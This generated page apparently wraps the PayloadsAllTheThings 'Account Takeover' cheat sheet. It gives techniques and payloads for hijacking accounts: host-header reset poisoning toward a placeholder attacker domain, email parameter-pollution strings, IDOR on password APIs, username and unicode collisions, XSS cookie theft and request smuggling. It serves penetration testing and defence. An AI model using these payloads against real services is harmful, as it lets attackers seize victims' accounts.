---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Account Takeover

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-account-takeover-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Account Takeover/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Account Takeover](../../topics/account-takeover/account-takeover.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-account-takeover-readme |
| name | Account Takeover |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/README.md |

## Preserved Source Material

````yaml
_body: "# Account Takeover\n\n> Account Takeover (ATO) is a significant threat in the cybersecurity landscape, involving unauthorized\
  \ access to users' accounts through various attack vectors.\n\n## Summary\n\n* [Password Reset Feature](#password-reset-feature)\n\
  \    * [Password Reset Token Leak via Referrer](#password-reset-token-leak-via-referrer)\n    * [Account Takeover Through\
  \ Password Reset Poisoning](#account-takeover-through-password-reset-poisoning)\n    * [Password Reset via Email Parameter](#password-reset-via-email-parameter)\n\
  \    * [IDOR on API Parameters](#idor-on-api-parameters)\n    * [Weak Password Reset Token](#weak-password-reset-token)\n\
  \    * [Leaking Password Reset Token](#leaking-password-reset-token)\n    * [Password Reset via Username Collision](#password-reset-via-username-collision)\n\
  \    * [Account Takeover Due To Unicode Normalization Issue](#account-takeover-due-to-unicode-normalization-issue)\n* [Account\
  \ Takeover via Web Vulnerabilities](#account-takeover-via-web-vulnerabilities)\n    * [Account Takeover via Cross Site Scripting](#account-takeover-via-cross-site-scripting)\n\
  \    * [Account Takeover via HTTP Request Smuggling](#account-takeover-via-http-request-smuggling)\n    * [Account Takeover\
  \ via CSRF](#account-takeover-via-csrf)\n* [References](#references)\n\n## Password Reset Feature\n\n### Password Reset\
  \ Token Leak via Referrer\n\n1. Request password reset to your email address\n2. Click on the password reset link\n3. Don't\
  \ change password\n4. Click any 3rd party websites(e.g., Facebook, twitter)\n5. Intercept the request in Burp Suite proxy\n\
  6. Check if the referer header is leaking password reset token.\n\n### Account Takeover Through Password Reset Poisoning\n\
  \n1. Intercept the password reset request in Burp Suite\n2. Add or edit the following headers in Burp Suite : `Host: [ATTACKER.DOMAIN.TLD]`,\
  \ `X-Forwarded-Host: [ATTACKER.DOMAIN.TLD]`\n3. Forward the request with the modified header\n\n    ```http\n    POST https://example.com/reset.php\
  \ HTTP/1.1\n    Accept: */*\n    Content-Type: application/json\n    Host: [ATTACKER.DOMAIN.TLD]\n    ```\n\n4. Look for\
  \ a password reset URL based on the *host header* like : `https://[ATTACKER.DOMAIN.TLD]/reset-password.php?token=TOKEN`\n\
  \n### Password Reset via Email Parameter\n\n```powershell\n# parameter pollution\nemail=victim@mail.com&email=hacker@mail.com\n\
  \n# array of emails\n{\"email\":[\"victim@mail.com\",\"hacker@mail.com\"]}\n\n# carbon copy\nemail=victim@mail.com%0A%0Dcc:hacker@mail.com\n\
  email=victim@mail.com%0A%0Dbcc:hacker@mail.com\n\n# separator\nemail=victim@mail.com,hacker@mail.com\nemail=victim@mail.com%20hacker@mail.com\n\
  email=victim@mail.com|hacker@mail.com\n```\n\n### IDOR on API Parameters\n\n1. Attacker have to login with their account\
  \ and go to the **Change password** feature.\n2. Start the Burp Suite and Intercept the request\n3. Send it to the repeater\
  \ tab and edit the parameters : User ID/email\n\n    ```powershell\n    POST /api/changepass\n    [...]\n    (\"form\":\
  \ {\"email\":\"victim@email.com\",\"password\":\"securepwd\"})\n    ```\n\n### Weak Password Reset Token\n\nThe password\
  \ reset token should be randomly generated and unique every time.\nTry to determine if the token expire or if it's always\
  \ the same, in some cases the generation algorithm is weak and can be guessed. The following variables might be used by\
  \ the algorithm.\n\n* Timestamp\n* UserID\n* Email of User\n* Firstname and Lastname\n* Date of Birth\n* Cryptography\n\
  * Number only\n* Small token sequence (<6 characters between [A-Z,a-z,0-9])\n* Token reuse\n* Token expiration date\n\n\
  ### Leaking Password Reset Token\n\n1. Trigger a password reset request using the API/UI for a specific email e.g: <test@mail.com>\n\
  2. Inspect the server response and check for `resetToken`\n3. Then use the token in an URL like `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`\n\
  \n### Password Reset via Username Collision\n\n1. Register on the system with a username identical to the victim's username,\
  \ but with white spaces inserted before and/or after the username. e.g: `\"admin \"`\n2. Request a password reset with your\
  \ malicious username.\n3. Use the token sent to your email and reset the victim password.\n4. Connect to the victim account\
  \ with the new password.\n\nThe platform CTFd was vulnerable to this attack.\nSee: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)\n\
  \n### Account Takeover Due To Unicode Normalization Issue\n\nWhen processing user input involving unicode for case mapping\
  \ or normalisation, unexpected behavior can occur.  \n\n* Victim account: `demo@gmail.com`\n* Attacker account: `demⓞ@gmail.com`\n\
  \n[Unisub - is a tool that can suggest potential unicode characters that may be converted to a given character](https://github.com/tomnomnom/hacks/tree/master/unisub).\n\
  \n[Unicode pentester cheatsheet](https://gosecure.github.io/unicode-pentester-cheatsheet/) can be used to find list of suitable\
  \ unicode characters based on platform.\n\n## Account Takeover via Web Vulnerabilities\n\n### Account Takeover via Cross\
  \ Site Scripting\n\n1. Find an XSS inside the application or a subdomain if the cookies are scoped to the parent domain\
  \ : `*.domain.com`\n2. Leak the current **sessions cookie**\n3. Authenticate as the user using the cookie\n\n### Account\
  \ Takeover via HTTP Request Smuggling\n\nRefer to **HTTP Request Smuggling** vulnerability page.\n\n1. Use **smuggler**\
  \ to detect the type of HTTP Request Smuggling (CL, TE, CL.TE)\n\n    ```powershell\n    git clone https://github.com/defparam/smuggler.git\n\
  \    cd smuggler\n    python3 smuggler.py -h\n    ```\n\n2. Craft a request which will overwrite the `POST / HTTP/1.1` with\
  \ the following data:\n\n    ```powershell\n    GET http://[ATTACKER.DOMAIN.TLD]  HTTP/1.1\n    X: \n    ```\n\n3. Final\
  \ request could look like the following\n\n    ```powershell\n    GET /  HTTP/1.1\n    Transfer-Encoding: chunked\n    Host:\
  \ something.com\n    User-Agent: Smuggler/v1.0\n    Content-Length: 83\n\n    0\n\n    GET http://[ATTACKER.DOMAIN.TLD]\
  \  HTTP/1.1\n    X: X\n    ```\n\nHackerone reports exploiting this bug\n\n* <https://hackerone.com/reports/737140>\n* <https://hackerone.com/reports/771666>\n\
  \n### Account Takeover via CSRF\n\n1. Create a payload for the CSRF, e.g: \"HTML form with auto submit for a password change\"\
  \n2. Send the payload\n\n### Account Takeover via JWT\n\nJSON Web Token might be used to authenticate a user.\n\n* Edit\
  \ the JWT with another User ID / Email\n* Check for weak JWT signature\n\n## References\n\n* [$6,5k + $5k HTTP Request Smuggling\
  \ mass account takeover - Slack + Zomato - Bug Bounty Reports Explained - August 30, 2020](https://web.archive.org/web/20250701123134/https://www.youtube.com/watch?v=gzM4wWA7RFo)\n\
  * [10 Password Reset Flaws - Anugrah SR - September 16, 2020](https://web.archive.org/web/20250626114943/https://anugrahsr.github.io/posts/10-Password-reset-flaws/)\n\
  * [Broken Cryptography & Account Takeovers - Harsh Bothra - September 20, 2020](https://web.archive.org/web/20250913121907/https://speakerdeck.com/harshbothra/broken-cryptography-and-account-takeovers?slide=28)\n\
  * [CTFd Account Takeover - NIST National Vulnerability Database - March 29, 2020](https://web.archive.org/web/20200329075120/https://nvd.nist.gov/vuln/detail/CVE-2020-7245)\n\
  * [Hacking Grindr Accounts with Copy and Paste - Troy Hunt - October 3, 2020](https://web.archive.org/web/20251219192449/https://www.troyhunt.com/hacking-grindr-accounts-with-copy-and-paste/)"
_relative_path: Account Takeover/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Account Takeover/README.md
````
